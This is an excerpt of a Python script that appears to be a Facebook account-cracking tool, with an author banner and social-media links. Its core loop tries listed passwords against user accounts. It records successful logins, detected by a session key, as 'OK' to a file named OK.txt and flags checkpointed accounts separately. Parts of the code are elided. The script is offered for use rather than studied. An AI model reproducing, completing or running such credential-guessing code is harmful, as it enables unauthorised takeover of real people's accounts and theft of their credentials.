...
def banner():
	...
	print("%s)
///  ____  _                   ____  _                 
/// / ___|(_) __ _ _ __ ___   | __ )| |__   __ _ _   _ 
/// \___ \| |/ _` | '_ ` _ \  |  _ \| '_ \ / _` | | | |
///  ___) | | (_| | | | | | | | |_) | | | | (_| | |_| |
/// |____/|_|\__,_|_| |_| |_| |____/|_| |_|\__,_|\__,_|
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %Siam Bhau                %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/SiamBhau-69  %s║"%(Z,B))
	print("%s║%s  Facebook:https://www.facebook.com/SiamBhau69      %s║"%(Z,B,Z))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in result:
				print('\033[1;32m [Siam-OK] '+user+'|'+pw+'\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [Siam-CP] '+user+'|'+pw+'\033[0;97m')
